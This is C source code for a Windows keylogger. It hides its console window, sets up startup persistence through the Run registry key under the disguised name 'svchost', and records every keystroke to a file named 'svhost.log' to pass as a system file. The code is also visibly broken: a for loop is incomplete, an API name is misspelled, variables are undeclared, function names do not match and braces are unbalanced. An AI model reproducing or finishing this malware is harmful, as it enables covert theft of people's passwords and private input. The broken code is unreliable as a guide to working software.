#include<windows.h>
#include<stdio.h>
#include<winuser.h>
#include<windowsx.h>

#define BUFSIZE 80

int main(void)
{
	int check_key;
        int c_key;
	int x_keys;

	//Hiding the window process, like a stealth mode
	HWND stealth_window;
	AllocConsole();
	stealth_window = FindWindowA("ConsoleWIndowClass",NULL);
	ShowWindow(stealth_window,0);

	check_key = test_key();

	if(check_key == 2)
	{
		char *path = "c:\\%windir%\\svchost.exe";
		c_key = create_key(path);
	}
	
	x_keys = log_keys();

	return x_keys;
}

int log_keys(void)
{
	short charac;
	while(1)
	{
		sleep(10);//making sure it doesnt nail down on your cpu
		for(charac = 8;charac <=;charac)
		{
			if(GetAsyncKeySate(charac) == -32767)
			{
				FILE *log_file;
				log_file = fopen("svhost.log","a+");//opening the file in append mode
				if(file == NULL)
					return(1);
				if(file != NULL)
				{
					if((charac >= 39) && (charac <= 64))
					{
						fputc(charac,log_file);
						fclose(log_file);
						break;
					}
					else if((charac > 64) && (charac < 91))//getting the normal a-z and A-Z keylogs
					{
						character+=32;
                                          	fputc(charac,log_file);
                                          	fclose(log_file);
                                          	break;
					}
					else //for that special keys that c is definitely not gonna name through ascii codes
                                    {
                                        switch(charac)
                                        {
                                              case VK_SPACE:
                                              	fputc(' ',log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_SHIFT:
                                              	fputs("[SHIFT]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_RETURN:
                                              	fputs("\n[ENTER]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_BACK:
                                              	fputs("[BACKSPACE]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_TAB:
                                              	fputs("[TAB]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_CONTROL:
                                              	fputs("[CTRL]",log_file);
                                              	fclose(log_file);
                                              break;
                                              case VK_DELETE:
                                              	fputs("[DEL]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_OEM_1:
                                              	fputs("[;:]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_OEM_2:
                                              	fputs("[/?]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_OEM_3:
                                              	fputs("[`~]",log_file);
                                              	fclose(log_file);
                                              break;
                                              case VK_OEM_4:
                                              	fputs("[ [{ ]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_OEM_5:
                                              	fputs("[\\|]",log_file);
                                              	fclose(log_file);
                                             	break;
                                              case VK_OEM_6:
                                              	fputs("[ ]} ]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_OEM_7:
                                              	fputs("['\"]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_NUMPAD0:
                                              	fputc('0',log_file);
                                              	fclose(log_file);
                                             	break;
                                              case VK_NUMPAD1:
                                              	fputc('1',log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_NUMPAD2:
                                              	fputc('2',log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_NUMPAD3:
                                              	fputc('3',log_file);
                                             	fclose(log_file);
                                              	break;
                                              case VK_NUMPAD4:
                                              	fputc('4',log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_NUMPAD5:
                                              	fputc('5',log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_NUMPAD6:
                                              	fputc('6',log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_NUMPAD7:
                                              	fputc('7',log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_NUMPAD8:
                                              	fputc('8',log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_NUMPAD9:
                                              	fputc('9',log_file);
                                              	fclose(log_file);
                                              	break;
                                              case VK_CAPITAL:
                                              	fputs("[CAPS LOCK]",log_file);
                                              	fclose(log_file);
                                              	break;
                                              default:
                                              	fclose(log_file);
                                              break;
				}
		}
	}
}

int key_checker(void)
{
	int check;
	HKEY hKey;
	char path[BUFSIZE];
	DWORD buf_len = BUFSIZE;
	int r_key;
	
	r_key = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
	if(r_key != 0)
	{
		check = 1;
		return check;
	}
	
	r_key = RegQueryValueEx(hKey,"svchost",NULL,NULL,(LPBYTE)path,&buf_length);	
}
